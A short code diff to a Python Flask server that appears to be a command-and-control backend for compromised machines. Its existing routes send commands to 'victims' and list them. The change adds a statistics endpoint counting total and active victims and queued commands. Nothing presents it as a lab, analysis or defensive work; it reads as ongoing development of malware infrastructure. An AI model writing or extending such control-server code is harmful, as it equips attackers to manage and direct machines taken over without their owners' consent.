@@ -55,5 +55,13 @@ def send_command():
 def get_victims():
     return jsonify(victims)
 
+@app.route('/api/stats', methods=['GET'])
+def get_stats():
+    return jsonify({
+        'total_victims': len(victims),
+        'active_victims': sum(1 for v in victims.values() if v.get('status') == 'active'),
+        'total_commands': sum(len(c) for c in commands.values())
+    })
+
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=False)
